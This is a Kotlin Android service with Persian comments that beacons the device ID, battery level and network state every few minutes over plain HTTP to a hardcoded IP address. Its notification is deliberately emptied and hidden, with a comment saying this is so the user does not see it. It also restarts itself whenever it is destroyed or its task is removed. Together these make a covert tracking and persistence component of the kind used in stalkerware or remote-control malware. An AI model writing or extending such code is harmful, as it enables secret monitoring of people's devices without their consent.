package com.example.test

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import androidx.core.app.NotificationCompat
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class HeartbeatService : Service() {

    private lateinit var deviceId: String
    private val handler = Handler(Looper.getMainLooper())

    // ✅ Heartbeat هوشمند: وقتی شارژه کوتاه‌تر، وقتی نیست طولانی‌تر
    private var currentInterval = NORMAL_INTERVAL

    companion object {
        private const val TAG = "HeartbeatService"
        private const val NORMAL_INTERVAL = 120000L      // 2 دقیقه (وقتی شارژه)
        private const val BATTERY_SAVE_INTERVAL = 300000L // 5 دقیقه (وقتی شارژ نیست)
    }

    private var lastOnlineState: Boolean? = null
    private var lastBatteryLevel: Int = -1

    // ✅ Receiver برای تشخیص تغییرات فوری
    private val connectivityReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            when (intent?.action) {
                ConnectivityManager.CONNECTIVITY_ACTION -> {
                    Log.d(TAG, "🔄 Network changed detected")
                    checkAndSendStatus(immediate = true)
                }
                Intent.ACTION_POWER_CONNECTED -> {
                    Log.d(TAG, "🔌 Power connected")
                    currentInterval = NORMAL_INTERVAL
                    checkAndSendStatus(immediate = true)
                }
                Intent.ACTION_POWER_DISCONNECTED -> {
                    Log.d(TAG, "🔋 Power disconnected")
                    currentInterval = BATTERY_SAVE_INTERVAL
                }
                Intent.ACTION_BATTERY_LOW -> {
                    Log.d(TAG, "⚠️ Battery low")
                    currentInterval = BATTERY_SAVE_INTERVAL
                }
            }
        }
    }

    private val heartbeatRunnable = object : Runnable {
        override fun run() {
            checkAndSendStatus(immediate = false)
            handler.postDelayed(this, currentInterval)
        }
    }

    override fun onCreate() {
        super.onCreate()
        deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)

        startForegroundNotification()
        registerReceivers()
        adjustIntervalBasedOnBattery()

        // ارسال فوری در شروع
        checkAndSendStatus(immediate = true)

        handler.post(heartbeatRunnable)

        Log.d(TAG, "✅ HeartbeatService started with interval: ${currentInterval / 1000}s")
    }

    private fun startForegroundNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "heartbeat_channel",
                "Background Service",
                NotificationManager.IMPORTANCE_MIN // ✅ حداقل اولویت
            ).apply {
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, "heartbeat_channel")
            .setContentTitle("")  // خالی تا کاربر نبینه
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setShowWhen(false)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()

        startForeground(2, notification)
    }

    private fun registerReceivers() {
        val filter = IntentFilter().apply {
            addAction(ConnectivityManager.CONNECTIVITY_ACTION)
            addAction(Intent.ACTION_POWER_CONNECTED)
            addAction(Intent.ACTION_POWER_DISCONNECTED)
            addAction(Intent.ACTION_BATTERY_LOW)
        }
        registerReceiver(connectivityReceiver, filter)
        Log.d(TAG, "✅ Receivers registered")
    }

    private fun adjustIntervalBasedOnBattery() {
        try {
            val batteryStatus = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            val status = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
            val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                    status == BatteryManager.BATTERY_STATUS_FULL

            currentInterval = if (isCharging) {
                NORMAL_INTERVAL
            } else {
                BATTERY_SAVE_INTERVAL
            }

            Log.d(TAG, "⚡ Interval adjusted: ${currentInterval / 1000}s (charging: $isCharging)")
        } catch (e: Exception) {
            Log.e(TAG, "Error checking battery", e)
        }
    }

    // ✅ تابع اصلی: فقط وقتی تغییر داشته باشه بفرسته
    private fun checkAndSendStatus(immediate: Boolean) {
        val isOnline = isNetworkAvailable()
        val batteryLevel = getBatteryPercentage()

        val shouldSend = immediate ||
                lastOnlineState == null ||
                lastOnlineState != isOnline ||
                Math.abs(batteryLevel - lastBatteryLevel) >= 5 // تغییر 5% باتری

        if (shouldSend) {
            Log.d(TAG, "📤 Sending: Online=$isOnline, Battery=$batteryLevel%")
            lastOnlineState = isOnline
            lastBatteryLevel = batteryLevel
            sendHeartbeat(isOnline, batteryLevel)
        } else {
            Log.d(TAG, "⏸️ No changes, skipping")
        }
    }

    private fun isNetworkAvailable(): Boolean {
        return try {
            val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val network = connectivityManager.activeNetwork ?: return false
                val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false

                capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
                        (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
                                capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ||
                                capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET))
            } else {
                @Suppress("DEPRECATION")
                val netInfo = connectivityManager.activeNetworkInfo
                netInfo != null && netInfo.isConnected
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error checking network", e)
            false
        }
    }

    private fun getBatteryPercentage(): Int {
        return try {
            val batteryStatus = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            val level = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
            if (level != -1 && scale != -1) {
                ((level / scale.toFloat()) * 100).toInt()
            } else -1
        } catch (e: Exception) {
            -1
        }
    }

    private fun sendHeartbeat(isOnline: Boolean, batteryLevel: Int) {
        Thread {
            try {
                val body = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("timestamp", System.currentTimeMillis())
                    put("isOnline", isOnline)
                    put("battery", batteryLevel)
                }

                val url = URL("http://95.134.130.160:8765/devices/heartbeat")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.connectTimeout = 8000
                conn.readTimeout = 8000
                conn.doOutput = true

                conn.outputStream.use { os ->
                    os.write(body.toString().toByteArray(Charsets.UTF_8))
                    os.flush()
                }

                val responseCode = conn.responseCode
                if (responseCode in 200..201) {
                    Log.d(TAG, "✅ Heartbeat sent successfully")
                } else {
                    Log.w(TAG, "⚠️ Response: $responseCode")
                }

                conn.disconnect()
            } catch (e: Exception) {
                Log.e(TAG, "❌ Heartbeat error", e)
            }
        }.start()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY // ✅ اگه کشته شد، دوباره زنده بشه
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        try {
            unregisterReceiver(connectivityReceiver)
        } catch (e: Exception) {
            Log.e(TAG, "Error unregistering receiver", e)
        }
        handler.removeCallbacks(heartbeatRunnable)
        Log.d(TAG, "👋 Service destroyed")

        // ✅ خودکار ریستارت
        val restartIntent = Intent(applicationContext, HeartbeatService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            applicationContext.startForegroundService(restartIntent)
        } else {
            applicationContext.startService(restartIntent)
        }
    }

    // ✅ از Android 8+ این متد هم کمک می‌کنه
    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        Log.d(TAG, "⚠️ Task removed, restarting service")

        val restartIntent = Intent(applicationContext, HeartbeatService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            applicationContext.startForegroundService(restartIntent)
        } else {
            applicationContext.startService(restartIntent)
        }
    }
}